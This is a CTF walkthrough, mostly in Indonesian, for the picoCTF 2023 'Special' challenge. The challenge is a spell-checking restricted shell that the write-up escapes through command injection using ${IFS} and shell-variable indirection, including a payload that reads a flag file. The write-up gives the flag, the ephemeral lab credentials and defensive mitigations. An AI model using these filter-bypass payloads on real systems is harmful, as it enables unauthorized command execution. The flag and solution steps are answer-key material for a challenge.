# 377 — Special (picoCTF 2023, General Skills, Medium)

## Challenge Metadata
- ID: 377 | Event: picoCTF 2023 | Author: (CyLab Academy)
- Kategori: General Skills | Difficulty: Medium (2)
- Flag: `academy{5p311ch3ck_15_7h3_w0r57_9fd4af4a}`
- Status: SOLVED (POST /api/submissions/ -> `correct: true`)

## Problem Statement & Scope
Lab SSH on-demand (`ssh -p <port> ctf-player@xebec...`): shell custom
`/usr/local/Special.py` ("Spell Checked Interface for Affecting
Linux") yang me-spellcheck tiap kata input — huruf pertama
dikapitalisasi (`ls` -> `Ls`, `echo hi` -> `Echo hi` -> `not found`).

## Teori & Akar Kerentanan (Root Cause)
Filter input diterapkan PER KATA berbasis spasi, tetapi kata PERTAMA
(sebelum spasi pertama) tidak disentuh. Ekspansi shell (`$VAR`,
`${IFS}`) terjadi SETELAH filter. Maka seluruh perintah yang disisipkan
dalam kata pertama lolos utuh: `L=ls;$L${IFS}/` diekspansi sh menjadi
`ls /`. Variabel `$X` sebagai argumen (kata ke-2+) justru dirusak
filter (`$B` -> `ab`), jadi semua argumen harus ikut dalam kata pertama
via `${IFS}`. CWE-78 (OS Command Injection) / CWE-1019 (Validate Before
Canonicalize): validasi pada bentuk mentah sebelum ekspansi kanonis.

## Rekonstruksi Pengujian Terstruktur
1. Launch instance (`PUT /api/challenges/377/instance/`), parse kredensial
   SSH dari description (port 37508, password `8d1db23b`).
2. Probing: `echo hi` -> `Echo hi` (gagal); `A=hi;echo $A` -> `a`
   (kata pertama lolos, `$A` kata kedua dirusak) — petakan model filter.
3. Bypass penuh: `L=ls;$L${IFS}/` -> listing root (`/challenge` ada);
   `L=ls;C=-la;$L${IFS}$C${IFS}/home/ctf-player` -> direktori `blargh/`
   berisi `flag.txt`; `L=ls;C=-la;$L${IFS}$C${IFS}/challenge` ->
   `config-box.py`, `metadata.json` (bukan flag).
4. `C=cat;F=/home/ctf-player/blargh/flag.txt;$C${IFS}$F` ->
   `academy{5p311ch3ck_15_7h3_w0r57_9fd4af4a}`.
5. Submit via `POST /api/submissions/` -> `correct: true`; DELETE instance.

## Flag & Verifikasi
- Flag resmi: `academy{5p311ch3ck_15_7h3_w0r57_9fd4af4a}`
- Verifikasi: `201 {"challenge": 377, "correct": true, "historical": false}`

## Takeaway Kompetensi LKS & Mitigasi Defensif
- Jangan filter blacklist per kata sebelum ekspansi shell; gunakan
  allowlist perintah + eksekusi tanpa shell (`execve` dengan argv).
- `${IFS}` + variabel adalah bypass klasik filter spasi; uji selalu
  `cat${IFS}flag`, `$VAR` indirection, dan word-splitting.
- Solver reproduktif: `scripts/solve_377_special.py` (pty ssh + bypass
  `${IFS}`; kredensial via argv karena port/password ephemeral).
